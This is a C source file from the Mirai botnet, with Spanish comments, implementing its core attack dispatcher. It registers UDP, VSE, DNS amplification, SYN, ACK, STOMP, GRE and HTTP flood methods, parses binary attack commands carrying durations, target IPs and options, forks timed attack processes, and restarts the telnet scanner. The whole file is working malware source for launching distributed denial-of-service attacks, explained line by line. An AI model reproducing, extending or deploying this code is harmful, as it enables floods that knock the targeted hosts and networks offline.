/***************************************************************************
 * Archivo: attack.c
 * 
 * Descripción: Implementación del sistema central de ataques para Mirai
 * Este módulo maneja:
 * - Inicialización y registro de métodos de ataque
 * - Gestión de ataques concurrentes
 * - Parseo de comandos de ataque
 * - Control de duración de ataques
 * - Opciones y configuraciones de ataque
 * 
 * Tipos de ataques soportados:
 * - UDP (Genérico, VSE, DNS, Plain)
 * - TCP (SYN, ACK, STOMP)
 * - GRE (IP, ETH)
 * - HTTP
 * 
 * Referencias técnicas:
 * - RFC 768 (UDP), RFC 793 (TCP)
 * - RFC 1701 (GRE)
 * - RFC 2616 (HTTP)
 ***************************************************************************/

/* Habilitar extensiones GNU */
#define _GNU_SOURCE

/* Cabeceras del sistema */
#ifdef DEBUG
#include <stdio.h>      /* printf() - Solo para depuración */
#endif
#include <stdlib.h>     /* malloc(), free(), etc */
#include <unistd.h>     /* fork(), sleep() */
#include <signal.h>     /* kill(), signal handling */
#include <errno.h>      /* errno, códigos de error */

/* Cabeceras locales */
#include "includes.h"   /* Definiciones comunes */
#include "attack.h"     /* Estructuras y constantes de ataque */
#include "rand.h"       /* Generación de números aleatorios */ 
#include "util.h"       /* Funciones de utilidad */
#include "scanner.h"    /* Escaneo de objetivos */


/* Variables globales para gestión de ataques */
uint8_t methods_len = 0;                                   /* Número de métodos de ataque registrados */
struct attack_method **methods = NULL;                     /* Array de punteros a métodos de ataque */
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};           /* Array de PIDs de ataques activos */

/**
 * Inicializa el sistema de ataques
 * 
 * Esta función registra todos los tipos de ataques soportados:
 * 1. Ataques UDP:
 *    - UDP Genérico: Flood básico de paquetes UDP
 *    - VSE: Ataque a servidores Valve Source Engine
 *    - DNS: Amplificación DNS
 *    - UDP Plain: Flood UDP simple sin raw sockets
 * 2. Ataques TCP:
 *    - SYN: Flood de paquetes SYN
 *    - ACK: Flood de paquetes ACK
 *    - STOMP: Ataque de paquetes TCP malformados
 * 3. Ataques GRE:
 *    - IP: Encapsulación IP en GRE
 *    - ETH: Encapsulación Ethernet en GRE
 * 4. Ataques de aplicación:
 *    - HTTP: Flood de peticiones HTTP
 * 
 * @return TRUE si la inicialización fue exitosa
 */
BOOL attack_init(void)
{
    int i;

    /* Registrar ataques UDP */
    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);     /* UDP flood genérico */
    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);        /* VSE flood */
    add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns);        /* DNS amplification */
    add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);/* UDP flood simple */

    /* Registrar ataques TCP */
    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);      /* SYN flood */
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);      /* ACK flood */
    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);  /* TCP STOMP */

    /* Registrar ataques GRE (Generic Routing Encapsulation) */
    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);     /* GRE sobre IP */
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);   /* GRE sobre Ethernet */

    /* Registrar ataques de capa de aplicación */
    //add_attack(ATK_VEC_PROXY, (ATTACK_FUNC)attack_app_proxy); /* Proxy flood - Deshabilitado */
    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);     /* HTTP flood */

    return TRUE; /* Inicialización exitosa */
}

/**
 * Termina todos los ataques en curso
 * 
 * Esta función:
 * 1. Detiene todos los procesos de ataque activos
 * 2. Limpia el array de ataques en curso
 * 3. Reinicia el escáner si está habilitado MIRAI_TELNET
 * 
 * El proceso de limpieza es necesario para:
 * - Liberar recursos del sistema
 * - Preparar para nuevos ataques
 * - Evitar conflictos entre ataques
 */
void attack_kill_all(void)
{
    int i;

#ifdef DEBUG
    printf("[ataque] Terminando todos los ataques activos\n");
#endif

    /* Iterar por todos los slots de ataques concurrentes */
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)           /* Si hay un ataque activo en este slot */
            kill(attack_ongoing[i], 9);        /* Enviar SIGKILL al proceso */
        attack_ongoing[i] = 0;                 /* Marcar slot como libre */
    }

#ifdef MIRAI_TELNET
    scanner_init();                           /* Reiniciar escáner si está habilitado */
#endif
}

/**
 * Parsea un comando de ataque desde un buffer
 * 
 * Formato del buffer:
 * [duración(4)] [vector(1)] [#objetivos(1)] [objetivos(6*n)] [#opts(1)] [opts(v)]
 * - duración: uint32 con duración en segundos
 * - vector: uint8 con el tipo de ataque
 * - #objetivos: uint8 con el número de objetivos
 * - objetivos: array de struct attack_target
 * - #opts: uint8 con el número de opciones
 * - opts: array de struct attack_option
 * 
 * @param buf   Buffer con el comando de ataque
 * @param len   Longitud del buffer
 */
void attack_parse(char *buf, int len)
{
    int i;
    uint32_t duration;                /* Duración del ataque en segundos */
    ATTACK_VECTOR vector;             /* Tipo de ataque a realizar */
    uint8_t targs_len, opts_len;      /* Número de objetivos y opciones */
    struct attack_target *targs = NULL; /* Array de objetivos */
    struct attack_option *opts = NULL;  /* Array de opciones */

    /* Leer duración del ataque (uint32_t en network byte order) */
    if (len < sizeof (uint32_t))
        goto cleanup;
    duration = ntohl(*((uint32_t *)buf)); /* Convertir a host byte order */
    buf += sizeof (uint32_t);            /* Avanzar buffer */
    len -= sizeof (uint32_t);            /* Actualizar longitud restante */

    /* Leer ID del tipo de ataque (uint8_t) */
    if (len == 0)
        goto cleanup;
    vector = (ATTACK_VECTOR)*buf++;      /* Extraer vector de ataque */
    len -= sizeof (uint8_t);

    /* Leer número de objetivos (uint8_t) */
    if (len == 0)
        goto cleanup;
    targs_len = (uint8_t)*buf++;         /* Extraer número de objetivos */
    len -= sizeof (uint8_t);             /* Actualizar longitud restante */
    if (targs_len == 0)                  /* Validar que hay al menos un objetivo */
        goto cleanup;

    /* Leer información de todos los objetivos 
     * Cada objetivo requiere:
     * - IPv4 (4 bytes)
     * - Máscara de red (1 byte) 
     */
    if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len))
        goto cleanup;
    targs = calloc(targs_len, sizeof (struct attack_target)); /* Reservar memoria */
    
    /* Procesar cada objetivo */
    for (i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf);     /* Copiar dirección IPv4 */
        buf += sizeof (ipv4_t);                /* Avanzar buffer */
        targs[i].netmask = (uint8_t)*buf++;    /* Copiar máscara de red */
        len -= (sizeof (ipv4_t) + sizeof (uint8_t));

        /* Configurar estructura de socket para el objetivo
         * - Familia: IPv4
         * - Dirección: La extraída del buffer
         */
        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
    }

    /* Leer número de opciones (uint8_t) */
    if (len < sizeof (uint8_t))
        goto cleanup;
    opts_len = (uint8_t)*buf++;           /* Extraer número de opciones */
    len -= sizeof (uint8_t);              /* Actualizar longitud restante */

    /* Leer todas las opciones si existen */
    if (opts_len > 0)
    {
        /* Reservar memoria para el array de opciones */
        opts = calloc(opts_len, sizeof (struct attack_option));
        
        /* Procesar cada opción */
        for (i = 0; i < opts_len; i++)
        {
            uint8_t val_len;

            /* Leer clave de la opción (uint8) */
            if (len < sizeof (uint8_t))
                goto cleanup;
            opts[i].key = (uint8_t)*buf++;    /* Extraer clave */
            len -= sizeof (uint8_t);

            /* Leer longitud del valor (uint8) */
            if (len < sizeof (uint8_t))
                goto cleanup;
            val_len = (uint8_t)*buf++;       /* Extraer longitud */
            len -= sizeof (uint8_t);

            /* Validar que hay suficientes datos y copiar valor */
            if (len < val_len)
                goto cleanup;
            /* Reservar memoria para el valor (+1 para null terminator) */
            opts[i].val = calloc(val_len + 1, sizeof (char));
            /* Copiar valor desde el buffer */
            util_memcpy(opts[i].val, buf, val_len);
            buf += val_len;                  /* Avanzar buffer */
            len -= val_len;                  /* Actualizar longitud */
        }
    }

    /* Resetear errno e iniciar el ataque */
    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);

    /* Limpieza: liberar memoria reservada */
    cleanup:
    if (targs != NULL)
        free(targs);                    /* Liberar array de objetivos */
    if (opts != NULL)
        free_opts(opts, opts_len);      /* Liberar array de opciones */
}

/**
 * Inicia un nuevo ataque con los parámetros especificados
 * 
 * Esta función crea dos procesos hijos:
 * 1. Primer hijo: Ejecuta el ataque real
 * 2. Segundo hijo: Controla la duración y termina el ataque
 * 
 * El uso de doble fork() permite:
 * - Aislar el proceso de ataque del proceso principal
 * - Controlar la duración de forma precisa
 * - Evitar procesos zombie
 * 
 * @param duration   Duración del ataque en segundos
 * @param vector     Tipo de ataque a realizar
 * @param targs_len  Número de objetivos
 * @param targs      Array de estructuras de objetivos
 * @param opts_len   Número de opciones
 * @param opts       Array de estructuras de opciones
 */
void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int pid1, pid2;

    /* Primer fork() para crear proceso hijo principal */
    pid1 = fork();
    if (pid1 == -1 || pid1 > 0)     /* Error o proceso padre */
        return;

    /* Segundo fork() para crear proceso de control de duración */
    pid2 = fork();
    if (pid2 == -1)                 /* Error en fork */
        exit(0);
    else if (pid2 == 0)             /* Proceso hijo de control */
    {
        sleep(duration);            /* Esperar duración especificada */
        kill(getppid(), 9);        /* Terminar proceso de ataque con SIGKILL */
        exit(0);                    /* Terminar proceso de control */
    }
    else                           /* Proceso de ataque */
    {
        int i;

        /* Buscar el método de ataque correspondiente al vector */
        for (i = 0; i < methods_len; i++)
        {
            if (methods[i]->vector == vector)
            {
#ifdef DEBUG
                printf("[ataque] Iniciando ataque...\n");
#endif
                /* Ejecutar la función de ataque con los parámetros */
                methods[i]->func(targs_len, targs, opts_len, opts);
                break;
            }
        }

        /* Terminar proceso de ataque si la función retorna */
        exit(0);
    }
}

/**
 * Obtiene una opción de ataque como string
 * 
 * @param opts_len  Número de opciones disponibles
 * @param opts      Array de opciones
 * @param opt       Clave de la opción a buscar
 * @param def       Valor por defecto si no se encuentra
 * @return          Valor de la opción o valor por defecto
 */
char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
{
    int i;

    /* Buscar la opción en el array */
    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].key == opt)
            return opts[i].val;     /* Retornar valor si se encuentra */
    }

    return def;                     /* Retornar valor por defecto */
}

/**
 * Obtiene una opción de ataque como entero
 * 
 * @param opts_len  Número de opciones disponibles
 * @param opts      Array de opciones
 * @param opt       Clave de la opción a buscar
 * @param def       Valor por defecto si no se encuentra
 * @return          Valor numérico de la opción o valor por defecto
 */
int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)
{
    /* Obtener valor como string */
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    /* Convertir a entero si existe, sino retornar default */
    if (val == NULL)
        return def;
    else
        return util_atoi(val, 10);  /* Convertir string a int en base 10 */
}

/**
 * Obtiene una opción de ataque como dirección IP
 * 
 * @param opts_len  Número de opciones disponibles
 * @param opts      Array de opciones
 * @param opt       Clave de la opción a buscar
 * @param def       Valor por defecto si no se encuentra
 * @return          Dirección IP en formato uint32_t (network byte order)
 */
uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    /* Obtener valor como string */
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    /* Convertir a IP si existe, sino retornar default */
    if (val == NULL)
        return def;
    else
        return inet_addr(val);      /* Convertir string a IPv4 */
}

/**
 * Registra un nuevo método de ataque en el sistema
 * 
 * Esta función auxiliar:
 * 1. Crea una nueva estructura attack_method
 * 2. Configura el vector y función de ataque
 * 3. Agrega el método al array global de métodos
 * 
 * @param vector   Vector/tipo de ataque a registrar
 * @param func     Función que implementa el ataque
 */
static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    /* Crear y configurar nuevo método de ataque */
    struct attack_method *method = calloc(1, sizeof (struct attack_method));

    method->vector = vector;     /* Tipo de ataque */
    method->func = func;         /* Función de implementación */

    /* Expandir array de métodos y agregar el nuevo */
    methods = realloc(methods, (methods_len + 1) * sizeof (struct attack_method *));
    methods[methods_len++] = method;
}

/**
 * Libera la memoria usada por un array de opciones de ataque
 * 
 * Esta función auxiliar:
 * 1. Libera cada valor string individual
 * 2. Libera el array completo de opciones
 * 
 * @param opts   Array de opciones a liberar
 * @param len    Longitud del array
 */
static void free_opts(struct attack_option *opts, int len)
{
    int i;

    /* Validar que el array existe */
    if (opts == NULL)
        return;

    /* Liberar cada valor string */
    for (i = 0; i < len; i++)
    {
        if (opts[i].val != NULL)
            free(opts[i].val);
    }

    /* Liberar el array completo */
    free(opts);
}
